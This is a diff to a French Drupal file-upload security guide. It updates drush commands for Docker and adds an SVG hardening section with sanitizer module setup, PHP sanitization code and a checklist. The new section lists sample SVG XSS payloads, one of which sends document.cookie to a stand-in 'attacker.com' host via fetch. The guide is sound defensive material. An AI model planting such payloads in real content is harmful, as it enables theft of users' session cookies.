@@ -133,7 +133,7 @@ Drupal génère automatiquement un `.htaccess` dans `sites/default/files/` qui b
 ls -la web/sites/default/files/.htaccess
 
 # Le régénérer si nécessaire
-ddev drush php:eval "file_ensure_htaccess();"
+docker compose exec php drush php:eval "file_ensure_htaccess();"
 ```
 
 ---
@@ -224,7 +224,57 @@ $extensions_dangereuses = [
 // Utiliser le module SVG Sanitizer ou le service DOMPurify côté client
 ```
 
-**SVG dans Drupal :** si tu dois autoriser les SVG, utiliser le module `svg_sanitizer` ou valider manuellement que le SVG ne contient pas de `<script>` ni d'événements JS (`onload`, `onerror`, etc.).
+### SVG — Guide complet de sécurisation
+
+Les SVG sont des fichiers XML — ils peuvent embarquer du JavaScript et déclencher des XSS.
+
+**Vecteurs d'attaque SVG :**
+```xml
+<!-- XSS via script inline -->
+<svg><script>document.cookie='stolen='+document.cookie</script></svg>
+
+<!-- XSS via event handler -->
+<svg onload="fetch('https://attacker.com?c='+document.cookie)"></svg>
+
+<!-- XSS via image externe -->
+<svg><image href="data:image/svg+xml,&lt;svg onload=alert(1)&gt;"/></svg>
+```
+
+**Solution recommandée : module `svg_sanitizer`**
+
+```bash
+composer require drupal/svg_sanitizer
+docker compose exec php drush en svg_sanitizer -y
+```
+
+Ce module nettoie automatiquement les SVG uploadés via les champs Media en supprimant les balises et attributs dangereux.
+
+**Solution manuelle si pas de module :**
+
+```php
+// Dans un hook_file_presave ou service custom
+use enshrined\svgSanitize\Sanitizer;
+
+$sanitizer = new Sanitizer();
+$cleanSvg = $sanitizer->sanitize(file_get_contents($file->getFileUri()));
+if ($cleanSvg === false) {
+  throw new \RuntimeException('SVG invalide ou malveillant');
+}
+file_put_contents($file->getFileUri(), $cleanSvg);
+```
+
+```bash
+# Dépendance PHP pour la sanitization
+composer require enshrined/svg-sanitize
+```
+
+**Checklist SVG :**
+- [ ] Module `svg_sanitizer` installé si SVG autorisés
+- [ ] Attributs `onload`, `onerror`, `onclick` bloqués
+- [ ] Balise `<script>` bloquée
+- [ ] `<use href="...">` limité aux ressources internes
+- [ ] SVG servis depuis `private://` si contenu confidentiel
+- [ ] `Content-Type: image/svg+xml` avec `X-Content-Type-Options: nosniff`
 
 ---
 
@@ -232,7 +282,7 @@ $extensions_dangereuses = [
 
 ```bash
 # Vérifier la config des champs fichier
-ddev drush php:eval "
+docker compose exec php drush php:eval "
   \$fields = \Drupal::entityTypeManager()->getStorage('field_config')->loadMultiple();
   foreach (\$fields as \$field) {
     if (in_array(\$field->getType(), ['file', 'image'])) {
